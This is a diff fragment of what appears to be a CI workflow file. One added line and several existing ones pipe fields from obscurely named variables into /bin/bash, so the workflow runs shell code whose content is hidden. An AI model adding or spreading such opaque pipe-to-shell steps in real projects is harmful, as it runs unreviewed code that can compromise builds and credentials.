@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$jgpu23" | jq -r .geo55 | /bin/bash
           printf '%s' "$mlmkp4" | jq -r .ehrx56 | /bin/bash
           printf '%s' "$ynaov47099" | jq -r .anp7 | /bin/bash
+          echo $bakw31494 | jq -r .rws0024 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
